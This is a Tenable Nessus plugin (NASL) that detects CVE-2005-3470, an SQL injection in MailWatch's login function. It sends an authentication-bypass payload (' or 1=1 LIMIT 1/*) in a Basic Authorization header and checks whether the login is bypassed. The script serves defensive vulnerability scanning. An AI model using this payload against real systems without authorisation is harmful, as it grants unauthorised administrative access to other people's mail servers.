#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to SQL
injection attacks. 

Description :

The remote host appears to be running MailWatch, a web-based frontend
to MailScanner written in PHP. 

The version of MailWatch installed on the remote host fails to
sanitize the username and password before using them in database
queries in the 'authenticate' function of 'functions.php'.  This issue
can be exploited, if PHP's 'magic_quotes' setting is disabled, to
launch SQL injection attacks against the affected application to, for
example, bypass authentication and thereby gain administrative access
to the application. 

Solution :

Upgrade to MailWatch 1.0.3 or later.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20176);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3470");
  script_bugtraq_id(15278);
  script_xref(name:"OSVDB", value:"20451");

  script_name(english:"MailWatch authenticate Function SQL Injection Vulnerability");
  script_summary(english:"Checks for authentication function SQL injection vulnerability in MailWatch");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/mailscanner", "/mailwatch", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure we're running MailWatch.
  res = http_get_cache(item:string(dir, "/"), port:port);
  if (res == NULL) exit(0);

  # If it is and we're not authenticated yet..
  if (
    'WWW-Authenticate: Basic realm="MailWatch for MailScanner' >< res &&
    "401 Unauthorized" >< res
  ) {
    # Try to exploit the flaw to bypass authentication.
    user = "' or 1=1 LIMIT 1/*";
    pass = SCRIPT_NAME;
    req = http_get(item:string(dir, "/"), port:port);
    req = str_replace(
      string:req,
      find:"User-Agent:",
      replace:string(
        "Authorization: Basic ", base64(str:string(user, ":", pass)), "\r\n",
        "User-Agent:"
      )
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like we got in.
    if ("Recent Messages</TITLE>" >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
